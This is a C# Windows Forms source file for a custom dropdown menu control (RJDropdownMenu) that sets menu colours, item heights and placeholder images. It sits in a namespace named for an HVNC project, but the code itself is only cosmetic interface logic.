using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace ShitarusPrivate.HVNC.Controls
{
    public class RJDropdownMenu : ContextMenuStrip
    {
        private bool isMainMenu;

        private int menuItemHeight = 25;

        private Color menuItemTextColor = Color.Empty;

        private Color primaryColor = Color.Empty;

        private Bitmap menuItemHeaderSize;

        [Category("RJ Code Advance")]
        public bool IsMainMenu
        {
            get
            {
                return isMainMenu;
            }
            set
            {
                isMainMenu = value;
            }
        }

        [Category("RJ Code Advance")]
        public int MenuItemHeight
        {
            get
            {
                return menuItemHeight;
            }
            set
            {
                menuItemHeight = value;
            }
        }

        [Category("RJ Code Advance")]
        public Color MenuItemTextColor
        {
            get
            {
                return menuItemTextColor;
            }
            set
            {
                menuItemTextColor = value;
            }
        }

        [Category("RJ Code Advance")]
        public Color PrimaryColor
        {
            get
            {
                return primaryColor;
            }
            set
            {
                primaryColor = value;
            }
        }

        public RJDropdownMenu(IContainer container)
            : base(container)
        {
        }

        private void LoadMenuItemHeight()
        {
            if (isMainMenu)
            {
                menuItemHeaderSize = new Bitmap(25, 45);
            }
            else
            {
                menuItemHeaderSize = new Bitmap(20, menuItemHeight);
            }
            foreach (ToolStripMenuItem item in Items)
            {
                item.ImageScaling = ToolStripItemImageScaling.None;
                if (item.Image == null)
                {
                    item.Image = menuItemHeaderSize;
                }
                foreach (ToolStripMenuItem dropDownItem in item.DropDownItems)
                {
                    dropDownItem.ImageScaling = ToolStripItemImageScaling.None;
                    if (dropDownItem.Image == null)
                    {
                        dropDownItem.Image = menuItemHeaderSize;
                    }
                    foreach (ToolStripMenuItem dropDownItem2 in dropDownItem.DropDownItems)
                    {
                        dropDownItem2.ImageScaling = ToolStripItemImageScaling.None;
                        if (dropDownItem2.Image == null)
                        {
                            dropDownItem2.Image = menuItemHeaderSize;
                        }
                        foreach (ToolStripMenuItem dropDownItem3 in dropDownItem2.DropDownItems)
                        {
                            dropDownItem3.ImageScaling = ToolStripItemImageScaling.None;
                            if (dropDownItem3.Image == null)
                            {
                                dropDownItem3.Image = menuItemHeaderSize;
                            }
                        }
                    }
                }
            }
        }

        protected override void OnHandleCreated(EventArgs e)
        {
            base.OnHandleCreated(e);
            if (!base.DesignMode)
            {
                base.Renderer = new MenuRenderer(isMainMenu, primaryColor, menuItemTextColor);
                LoadMenuItemHeight();
            }
        }
    }
}
